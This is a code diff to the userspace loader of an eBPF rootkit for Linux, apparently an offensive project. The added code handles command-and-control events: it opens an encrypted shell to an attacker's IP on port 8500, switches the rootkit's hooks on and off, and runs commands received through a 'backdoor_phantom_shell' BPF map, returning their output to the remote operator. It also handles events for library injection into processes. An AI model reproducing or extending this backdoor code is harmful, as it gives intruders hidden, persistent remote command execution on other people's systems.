@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <argp.h>
 #include <stdio.h>
 #include <time.h>
@@ -5,8 +6,15 @@
 #include <sys/resource.h>
 #include <bpf/libbpf.h>
 #include <linux/if_link.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <sys/ioctl.h>
+#include <netinet/in.h>
 #include <net/if.h>
 #include <unistd.h>
+#include <locale.h>
 #include <dlfcn.h>
 #include <link.h>
 
@@ -16,20 +24,70 @@
 
 #include "../common/constants.h"
 #include "../common/map_common.h"
+#include "../common/c&c.h"
+#include "../common/struct_common.h"
 #include "include/utils/files/path.h"
 #include "include/utils/strings/regex.h"
 #include "include/utils/structures/fdlist.h"
 #include "include/modules/module_manager.h"
+#include "include/utils/network/ssl_client.h"
 #include "include/utils/mem/injection.h"
+
 #define ABORT_IF_ERR(err, msg)\
 	if(err<0){\
 		fprintf(stderr, msg);\
 		goto cleanup\
 	}
 
+static int FD_TC_MAP;
+__u32 ifindex; //Interface to which the rootkit connects
+char* local_ip;
+
 static struct env {
 	bool verbose;
 } env;
+
+int check_map_fd_info(int map_fd, struct bpf_map_info *info, struct bpf_map_info *exp){
+	__u32 info_len = sizeof(*info);
+	int err;
+
+	if (map_fd < 0)
+		return -1;
+
+	err = bpf_obj_get_info_by_fd(map_fd, info, &info_len);
+	if (err) {
+		fprintf(stderr, "ERR: %s() can't get info - %s\n",
+			__func__,  strerror(errno));
+		return -1;
+	}
+
+	if (exp->key_size && exp->key_size != info->key_size) {
+		fprintf(stderr, "ERR: %s() "
+			"Map key size(%d) mismatch expected size(%d)\n",
+			__func__, info->key_size, exp->key_size);
+		return -1;
+	}
+	if (exp->value_size && exp->value_size != info->value_size) {
+		fprintf(stderr, "ERR: %s() "
+			"Map value size(%d) mismatch expected size(%d)\n",
+			__func__, info->value_size, exp->value_size);
+		return -1;
+	}
+	if (exp->max_entries && exp->max_entries != info->max_entries) {
+		fprintf(stderr, "ERR: %s() "
+			"Map max_entries(%d) mismatch expected size(%d)\n",
+			__func__, info->max_entries, exp->max_entries);
+		return -1;
+	}
+	if (exp->type && exp->type  != info->type) {
+		fprintf(stderr, "ERR: %s() "
+			"Map type(%d) mismatch expected type(%d)\n",
+			__func__, info->type, exp->type);
+		return -1;
+	}
+
+	return 0;
+}
 
 void print_help_dialog(const char* arg){
 	
@@ -91,6 +149,7 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 	//For time displaying
 	struct tm *tm;
 	char ts[32];
+	int ret;
 	time_t t;
 	time(&t);
 	tm = localtime(&t);
@@ -105,6 +164,94 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 
 	}else if(e->event_type == EXIT){
 
+	}else if(e->event_type == COMMAND){
+		printf("%s COMMAND  pid:%d code:%i\n", ts, e->pid, e->code);
+		char attacker_ip[INET_ADDRSTRLEN];
+		switch(e->code){
+			case CC_PROT_COMMAND_ENCRYPTED_SHELL:
+			//TODO EXTRACT IP FROM KERNEL BUFFER
+				inet_ntop(AF_INET, &e->client_ip, attacker_ip, INET_ADDRSTRLEN);
+				printf("Starting encrypted connection with ip: %s\n", attacker_ip);
+				client_run(attacker_ip, 8500);
+            	break;
+			case CC_PROT_COMMAND_HOOK_ACTIVATE_ALL:
+				printf("Activating all hooks as requested\n");
+				activate_all_modules_config();
+				ret = unhook_all_modules();
+				if(ret<0) printf("Failed to complete command: unhook all\n");
+				ret = setup_all_modules();
+				if(ret<0) printf("Failed to complete command: setup modules\n");
+            	break;
+			case CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL:
+				printf("Deactivating all hooks as requested\n");
+				deactivate_all_modules_config();
+				ret = unhook_all_modules();
+				if(ret<0) printf("Failed to complete command: unhook all\n");
+            	break;
+			default:
+				printf("Command received unknown: %d\n", e->code);
+		}
+	}else if(e->event_type == PSH_UPDATE){
+		printf("Requested to update the phantom shell\n");
+		int key = 1;
+		struct backdoor_phantom_shell_data data;
+		struct bpf_map_info map_expect = {0};
+		struct bpf_map_info info = {0};
+		FD_TC_MAP = bpf_obj_get("/sys/fs/bpf/tc/globals/backdoor_phantom_shell");
+		printf("TC MAP ID: %i\n", FD_TC_MAP);
+		map_expect.key_size    = sizeof(__u64);
+		map_expect.value_size  = sizeof(struct backdoor_phantom_shell_data);
+		map_expect.max_entries = 1;
+		int err = check_map_fd_info(FD_TC_MAP, &info, &map_expect);
+		if (err) {
+			fprintf(stderr, "ERR: map via FD not compatible\n");
+			return err;
+		}
+		err = bpf_map_lookup_elem(FD_TC_MAP, &key, &data);
+		if(err<0) {
+			printf("Failed to read the shared map: %d\n", err);
+			return -1;
+		}
+		printf("Pre value: %i, %i, %i, %s\n", data.active, data.d_ip, data.d_port, data.payload);
+		data.active = e->bps_data.active;
+		data.d_ip = e->bps_data.d_ip;
+		data.d_port = e->bps_data.d_port;
+		if(strncmp(e->bps_data.payload, CC_PROT_PHANTOM_SHELL_INIT, strlen(CC_PROT_PHANTOM_SHELL_INIT))!=0){
+			//Means that we invoked the command with another payload, thus this is not the first call
+			//We are tasked with first trying to execute the command
+			printf("Executing requested command: \n%s\n", e->bps_data.payload);
+			char *p;
+			char* buf = calloc(4096, sizeof(char));
+			strcpy(buf, e->bps_data.payload);
+			p = strtok((char*)buf, "#");
+			p = strtok(NULL, "#");
+			if (p) {
+				//printf("Executing command: %s\n", p);
+				char *res = execute_command((char*)p);
+				char *response = calloc(4096, sizeof(char));
+				if(res==NULL){
+					strcpy(response, CC_PROT_ERR);
+				}else{
+					strcpy(response, CC_PROT_PHANTOM_COMMAND_RESPONSE);
+					strcat(response, res);
+				}
+				//printf("Answering to phantom shell: \n%s\n", response);
+				memcpy(data.payload, response, 64);
+				free(response);
+				free(buf);
+				printf("Post value: %i, %i, %i, %s\n", data.active, data.d_ip, data.d_port, data.payload);
+				bpf_map_update_elem(FD_TC_MAP, &key, &data, 0);
+				return 0;
+
+			}else{
+				printf("Failed to parse command\n");
+				return -1;
+			}
+		}
+		//Init connection with phantom shell
+		memcpy(data.payload, e->bps_data.payload, 64);
+		printf("Post value: %i, %i, %i, %s\n", data.active, data.d_ip, data.d_port, data.payload);
+		bpf_map_update_elem(FD_TC_MAP, &key, &data, 0);
 	}else if(e->event_type == VULN_SYSCALL){
 		//eBPF detected syscall which can lead to library injection
 		printf("%s VULN_SYSCALL  pid:%d syscall:%llx, return:%llx, libc_main:%llx, libc_dlopen_mode:%llx, libc_malloc:%llx, got:%llx, relro:%i\n", ts, e->pid, e->syscall_address, e->process_stack_return_address, e->libc_main_address, e->libc_dlopen_mode_address, e->libc_malloc_address, e->got_address, e->relro_active);
@@ -112,17 +259,18 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 			printf("Library injection failed\n");
 		}
 	}else{
-		printf("UNRECOGNIZED RB EVENT RECEIVED");
+		printf("%s COMMAND  pid:%d code:%i, msg:%s\n", ts, e->pid, e->code, e->message);
 		return -1;
 	}
 
 	return 0;
 }
 
-
 int main(int argc, char**argv){
     struct ring_buffer *rb = NULL;
     struct kit_bpf *skel;
+	struct bpf_map_info map_expect = {0};
+	struct bpf_map_info info = {0};
     __u32 err;
 
 	//Ready to be used
@@ -132,8 +280,6 @@ int main(int argc, char**argv){
 			return EXIT_FAILURE;
 		}
 	}*/
-	
-	__u32 ifindex; 
 
 	/* Parse command line arguments */
 	int opt;
@@ -146,6 +292,16 @@ int main(int argc, char**argv){
 				perror("Error on input interface");
 				exit(EXIT_FAILURE);
 			}
+			int fd = socket(AF_INET, SOCK_DGRAM, 0);
+			struct ifreq ifr;
+			//Type of address to retrieve - IPv4 IP address
+			ifr.ifr_addr.sa_family = AF_INET;
+			//Copy the interface name in the ifreq structure
+			strncpy(ifr.ifr_name , optarg , IFNAMSIZ-1);
+			ioctl(fd, SIOCGIFADDR, &ifr);
+			close(fd);
+			local_ip = inet_ntoa(( (struct sockaddr_in *)&ifr.ifr_addr )->sin_addr);
+			printf("%s - %s\n" , optarg , local_ip );
 			break;
 		case 'v':
 			//Verbose output
@@ -188,12 +344,53 @@ int main(int argc, char**argv){
 		return 1;
 	}
 
+	
+	
 	//Load & verify BPF program
 	err = kit_bpf__load(skel);
 	if (err) {
 		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
 		goto cleanup;
 	}
+
+	FD_TC_MAP = bpf_obj_get("/sys/fs/bpf/tc/globals/backdoor_phantom_shell");
+	printf("TC MAP ID: %i\n", FD_TC_MAP);
+	map_expect.key_size    = sizeof(__u64);
+	map_expect.value_size  = sizeof(struct backdoor_phantom_shell_data);
+	map_expect.max_entries = 1;
+	err = check_map_fd_info(FD_TC_MAP, &info, &map_expect);
+	if (err) {
+		fprintf(stderr, "ERR: map via FD not compatible\n");
+		return err;
+	}
+	printf("Collected stats from BPF map:\n");
+	printf(" - BPF map (bpf_map_type:%d) id:%d name:%s"
+			" key_size:%d value_size:%d max_entries:%d\n",
+			info.type, info.id, info.name,
+			info.key_size, info.value_size, info.max_entries
+			);
+	int key = 1;
+	struct backdoor_phantom_shell_data data;
+	err = bpf_map_lookup_elem(FD_TC_MAP, &key, &data);
+	if(err<0) {
+		printf("Failed to lookup element\n");
+	}
+	printf("Value: %i, %i, %i\n", data.active, data.d_ip, data.d_port);
+	//bpf_map_update_elem(tc_efd, &key, &data, 0);
+
+	/*bpf_obj_get(NULL);
+	char* DIRECTORY_PIN = "/sys/fs/bpf/mymaps";
+	err = bpf_object__unpin_maps(skel->obj, DIRECTORY_PIN);
+	if (err) {
+		fprintf(stderr, "ERR: UNpinning maps in %s\n",DIRECTORY_PIN);
+		//return -1;
+	}
+	err = bpf_object__pin_maps(skel->obj, DIRECTORY_PIN);
+	if (err) {
+		fprintf(stderr, "ERR: pinning maps in %s\n",DIRECTORY_PIN);
+		return -1;
+	}
+	bpf_map__pin(skel->maps.backdoor_phantom_shell, DIRECTORY_PIN);*/
 
 	//Attach XDP and sched modules using module manager
 	//and setup the parameters for the installation
